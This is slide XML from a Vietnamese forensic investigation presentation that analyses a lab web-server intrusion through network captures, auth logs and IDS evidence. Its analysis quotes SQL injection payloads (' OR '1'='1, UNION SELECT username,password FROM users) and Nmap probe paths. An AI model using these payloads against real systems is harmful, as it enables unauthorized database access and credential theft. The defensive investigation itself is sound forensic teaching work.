              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="632" name="Google Shape;632;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1601263" y="4571800"/>
            <a:ext cx="8480824" cy="10287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636"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="637" name="Google Shape;637;p58"/>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6.3.4. Chi tiết - Phân tích attack.pcap + auth.log: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="638" name="Google Shape;638;p58"/>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9" name="Google Shape;639;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1670000"/>
            <a:ext cx="10521300" cy="4588500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Phân tích gói tin HTTP:</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Các request GET/POST tới endpoint /sdk, /HNAP1, /evox/about, /nmaplowercheck... với User-Agent Nmap Scripting Engine =&gt; chứng minh attacker dùng NSE để dò lỗ hổng.</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Các request tới /search.php?id=... chứa payload SQL Injection:'</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OR '1'='1 =&gt; bypass logic.</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UNION SELECT database() =&gt; enumeration database.</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UNION SELECT username,password FROM users =&gt; trích xuất dữ liệu nhạy cảm.</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Request POST /login.php trả về 302 redirect → đăng nhập thành công.</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GET /admin.php trả về 200 OK → truy cập trái phép khu vực quản trị.</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Đây là chuỗi SQL Injection → credential access → authenticated access.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Kết luận sơ bộ:</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Phân tích file attack.pcap và auth.log cho thấy:</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IP 192.168.221.143 là nguồn tấn công</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Hành vi gồm quét dịch vị web, khai thác SQL Injection, truy cập trái phép khu vực quản trị.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="45720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Hành vi gửi file đến máy attacker</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>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643"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="644" name="Google Shape;644;p59" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1553625"/>
            <a:ext cx="11029950" cy="5081525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="645" name="Google Shape;645;p59"/>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6.4. Tạo Timeline:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="646" name="Google Shape;646;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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647" name="Google Shape;647;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="936100" y="1553625"/>
            <a:ext cx="4537350" cy="5081524"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="648" name="Google Shape;648;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5694750" y="1688175"/>
            <a:ext cx="5594624" cy="2018150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="649" name="Google Shape;649;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5694749" y="4126420"/>
            <a:ext cx="5594625" cy="1469029"/>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653"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="654" name="Google Shape;654;p60"/>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6.5. Báo cáo kết quả điều tra:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="655" name="Google Shape;655;p60"/>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6" name="Google Shape;656;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thông tin chung về cuộc điều tra:   </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="657" name="Google Shape;657;p60" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="658" name="Google Shape;658;p60" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1818450"/>
            <a:ext cx="11029950" cy="3859525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="659" name="Google Shape;659;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2232000"/>
            <a:ext cx="9377100" cy="2344200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Người thực hiện điều tra:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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1. Trần Thị Ánh Nguyệt</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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2. Trần Phúc Tiến</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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3. Tạ Lê Anh Bảo</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Thời gian thu thập chứng cứ: Ngày 27/05/2026. Múi giờ hệ thống: Asia/Ho_Chi_Minh (+07).</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Phương pháp thu thập: Thu thập pháp y trực tiếp và sao chép an toàn qua giao thức SCP.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Xác nhận tính toàn vẹn: Tất cả chứng cứ đã được băm bằng thuật toán SHA256 ngay sau khi thu thập để đảm bảo không bị thay đổi.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>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663"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="664" name="Google Shape;664;p61"/>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6.5. Báo cáo kết quả điều tra:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="665" name="Google Shape;665;p61"/>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6" name="Google Shape;666;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Các loại nhật ký và chứng cứ đã thu thập:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="667" name="Google Shape;667;p61" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="668" name="Google Shape;668;p61" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="1975275"/>
            <a:ext cx="11029950" cy="3859525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="669" name="Google Shape;669;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2232000"/>
            <a:ext cx="9377100" cy="3466500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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Để phục vụ phân tích, điều tra viên đã trích xuất các nguồn dữ liệu sau từ các thành phần hệ thống:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Từ máy chủ nạn nhân (Victim Web Server - 192.168.221.134):</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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access.log và error.log: Nhật ký truy cập và lỗi của Apache.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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query.log: Nhật ký truy vấn chi tiết của MariaDB/MySQL.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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auth.log: Nhật ký xác thực hệ thống.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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attack.pcap: Tệp bắt gói tin lưu lượng mạng.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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Các tệp trạng thái hệ thống: process.txt (tiến trình), connections.txt (kết nối mạng), session.txt &amp;who.txt (người dùng đang đăng nhập), system.txt (thông tin cấu hình).</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Từ máy chủ IDS (Suricata - 192.168.221.141):</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
